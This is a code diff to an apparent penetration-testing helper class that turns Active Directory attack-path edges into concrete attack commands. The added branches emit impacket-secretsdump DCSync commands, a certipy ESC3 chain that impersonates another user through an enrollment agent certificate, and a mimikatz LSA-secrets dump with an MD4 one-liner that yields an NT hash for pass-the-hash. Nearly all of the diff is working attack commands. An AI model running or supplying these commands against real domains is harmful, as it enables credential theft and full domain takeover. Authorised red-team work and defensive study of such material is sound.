@@ -96,6 +96,13 @@ class CommandOracle:
         normalized_edge = edge_type or "Unknown"
 
         if normalized_edge == "DCSync":
+            if target.node_type == "domain":
+                target_domain = target.name or domain
+                return (
+                    f"impacket-secretsdump{auth_part} {target_domain}/{username}@<TARGET_DC_HOST> "
+                    "-just-dc"
+                )
+
             target_dc = target.name or "<DC_HOST>"
             return (
                 f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} "
@@ -142,6 +149,36 @@ class CommandOracle:
                 "# If you have administrative access on this DC, domain compromise is typically one step away\n"
                 f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC_HOST> -just-dc\n"
                 f"# Target domain: {target_domain}"
+            )
+
+        if normalized_edge == "DelegatedEnrollmentAgent":
+            template = target.name or "<ON_BEHALF_TEMPLATE>"
+            return (
+                "# DelegatedEnrollmentAgent: enrollment-agent delegation relationship (not sufficient by itself)\n"
+                "# ESC3 requires this relationship plus a compatible Enrollment Agent cert/template path\n"
+                "# 1) Enroll Enrollment Agent certificate\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
+                "-template <ENROLLMENT_AGENT_TEMPLATE>\n"
+                "# 2) Request cert on behalf of another principal using delegated template\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> "
+                f"-template {template} -on-behalf-of <TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
+                "# 3) Authenticate as target principal\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        if normalized_edge == "DumpSMSAPassword":
+            source_host = source.name or "<SOURCE_COMPUTER>"
+            target_account = target.name or "<TARGET_SMSA_ACCOUNT>"
+            return (
+                "# DumpSMSAPassword: requires administrative privileges on source computer\n"
+                f"# Source computer: {source_host}  Target sMSA: {target_account}\n"
+                "# Dump LSA secrets on-host (elevated):\n"
+                "mimikatz # privilege::debug\n"
+                "mimikatz # token::elevate\n"
+                "mimikatz # lsadump::secrets\n"
+                "# Locate the _SC_<GUID> secret for the target sMSA and extract cur/hex\n"
+                "python3 -c \"import hashlib,sys; print(hashlib.new('md4', bytes.fromhex(sys.argv[1])).hexdigest())\" <HEX_PASSWORD>\n"
+                "# Use resulting NT hash for pass-the-hash authentication as the sMSA account"
             )
 
         if normalized_edge == "GenericAll" and target.node_type == "computer":
